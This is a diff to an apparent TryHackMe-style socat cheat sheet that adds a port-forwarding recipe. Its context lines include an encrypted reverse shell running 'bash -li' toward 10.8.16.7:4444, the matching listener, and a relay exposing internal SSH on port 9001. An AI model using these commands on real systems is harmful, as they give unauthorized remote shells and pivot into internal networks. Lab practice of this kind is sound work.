@@ -10,6 +10,10 @@
 ##### Listen
 `socat -dd TCP-L:5555 STDOUT`
 
+##### Open a port to connect to another machine
+```
+socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+```
 
 ##### Create encrypted reverse shell
 ```
@@ -19,7 +23,7 @@ socat OPENSSL-CONNECT:10.8.16.7:4444 EXEC:"bash -li",pty,stderr,sigint,setsid,sa
 socat -d -d OPENSSL-LISTEN:4444,cert=/home/edu/THM/EXPLOITS/shell.pem,verify=0// Listen
 ```
 
-##### Open external port to access internal
+##### Open external port to access internal service
 ```
 ./socat_linux tcp-listen:9001,reuseaddr,fork tcp:127.0.0.1:22      // Opens port 9001, connecting to the internal SSH protocol
 ```
